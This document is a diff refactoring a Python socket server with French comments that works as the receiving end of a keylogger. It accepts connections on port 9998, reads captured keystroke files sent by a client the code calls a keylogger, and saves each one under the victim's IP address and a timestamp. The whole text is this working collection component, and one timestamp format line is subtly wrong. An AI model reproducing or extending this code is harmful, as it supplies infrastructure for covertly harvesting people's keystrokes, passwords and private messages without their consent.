@@ -2,58 +2,58 @@ import threading
 import socket
 import time
 import sys
+from datetime import datetime
 
 def handle_co():
-    global running_thrd
-    global client_sockets
+    global running_thrd, client_sockets
+
     while running_thrd:
         try:
             client, addr = server.accept()
             client_sockets.append(client)
-            rcvFile = threading.Thread(target=recvFileFrmKlg, args=(client,))
-            rcvFile.start()       
+            rcv_file_thread = threading.Thread(target=recv_file_from_klg, args=(client,addr))
+            rcv_file_thread.start()
         except BlockingIOError:
             continue
 
-def recvFileFrmKlg(client_sock):
+
+def recv_file_from_klg(client_sock, addr):
     global running_thrd
-    file_status = False
+    bufer_size = 1024 # Pour la reception des data
+    
     try:
-        while running_thrd:
-            file_name = client_sock.recv(1024)
-            if not file_name:
-                print("Aucune donnée reçu, fin de la connexion")
-                break
-            file_name = file_name.decode().split('\n')[0]
-            with open(file_name, "wb") as file:#file = open(file_name, "wb")
-                print("recv debut")
-                file_bytes = b"" 
-                while running_thrd:
-                    data = client_sock.recv(1024) 
-                    file_bytes += data    
-                    if b"<END>" in file_bytes: 
-                        file_bytes = file_bytes[:-5]
-                        file_status = True
-                        break
-                    
-                file.write(file_bytes)
-                file.flush()
+        _ = client_sock.recv(bufer_size).decode().strip()
+        if not _:
+            print("Aucune donée reçu fin de la connexion")
+            return
+        
+        # Generation du nom de fichier unique
+        timestamp = datetime.now().strftime("%Y%M%d_%H%M%S")
+        ip_client = addr[0].replace(".", "-")
+        unique_filename = f"{ip_client}_{timestamp}-keyboard.txt"
 
-                if file_status:                       
-                    client_sock.sendall(b"ACK")    
-                    print("recv fin")
-    except KeyboardInterrupt:
-        file.close()
+        with open(unique_filename, "wb") as f:
+            print(f"Début de reception du fichier {unique_filename}")
+            while running_thrd:
+                data = client_sock.recv(bufer_size)
+                if not data or b"<END>" in data:
+                    f.write(data[:-5]) # Je supprime <END>
+                    break
+                f.write(data)
+            client_sock.sendall(b"ACK")
+            print(f"Fin de reception du fichier {unique_filename}")
+    except Exception as e:
+        print(f"Erreur lors de la reception du fichier : {e}")
+    finally:
         client_sock.close()
-        print("Connexion fermée")        
 
-if __name__ == '__main__' :
+
+if __name__ == '__main__':
     host, port = ("localhost", 9998)
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind((host, port)) 
-    server.listen() 
-    #client, addr = server.accept() 
+    server.bind((host, port))
+    server.listen()
     server.setblocking(True)
 
     running_thrd = True
@@ -66,12 +66,12 @@ if __name__ == '__main__' :
         while running_thrd:
             time.sleep(1)
     except KeyboardInterrupt:
-        print("CTRL + C detected")
+        print("CTRL + C détecté")
         running_thrd = False
         for client in client_sockets:
             try:
                 client.sendall(b"<SERVER_SHUTDOWN>")
-            except:
+            except Exception:
                 pass
         server.close()
         thrd_co.join()
